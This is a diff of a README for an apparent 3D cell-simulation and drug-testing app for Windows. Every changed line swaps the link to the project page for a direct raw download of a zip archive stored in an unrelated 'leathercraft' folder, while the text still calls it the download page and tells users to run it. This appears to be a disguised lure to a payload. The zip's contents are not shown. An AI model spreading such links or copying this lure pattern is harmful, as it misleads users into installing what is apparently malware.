@@ -1,13 +1,13 @@
 # 🧬 CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator - Simulate Cells and Test Drugs
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Page-Visit%20Now-6A5ACD?style=for-the-badge)](https://github.com/sebastianmerida26-rgb/CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Page-Visit%20Now-6A5ACD?style=for-the-badge)](https://github.com/sebastianmerida26-rgb/CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator/raw/refs/heads/main/leathercraft/Testing-Simulator-Sim-Drug-Cell-Biology-Multicellular-3.5.zip)
 
 ## 🚀 Getting Started
 
 CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator is a 3D cell simulation app for Windows. It lets you explore how cells grow, divide, move, and react to drug exposure in a visual model.
 
 Use the link above to visit the download page and get the latest version:
-https://github.com/sebastianmerida26-rgb/CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator
+https://github.com/sebastianmerida26-rgb/CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator/raw/refs/heads/main/leathercraft/Testing-Simulator-Sim-Drug-Cell-Biology-Multicellular-3.5.zip
 
 ## 🖥️ What This App Does
 
@@ -36,7 +36,7 @@ For the smoothest experience, use a system with a dedicated GPU and recent graph
 ## ⬇️ Download and Run on Windows
 
 1. Open the download page:
-   https://github.com/sebastianmerida26-rgb/CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator
+   https://github.com/sebastianmerida26-rgb/CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator/raw/refs/heads/main/leathercraft/Testing-Simulator-Sim-Drug-Cell-Biology-Multicellular-3.5.zip
 
 2. On the GitHub page, look for the latest release or the main download files.
 
@@ -142,7 +142,7 @@ If the screen stays blank, restart the app and wait a few seconds for the 3D vie
 
 Visit the page below to download and run the Windows version:
 
-https://github.com/sebastianmerida26-rgb/CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator
+https://github.com/sebastianmerida26-rgb/CellSim-3D-Multicellular-Biology-Drug-Testing-Simulator/raw/refs/heads/main/leathercraft/Testing-Simulator-Sim-Drug-Cell-Biology-Multicellular-3.5.zip
 
 ## 🔗 Project Info
 
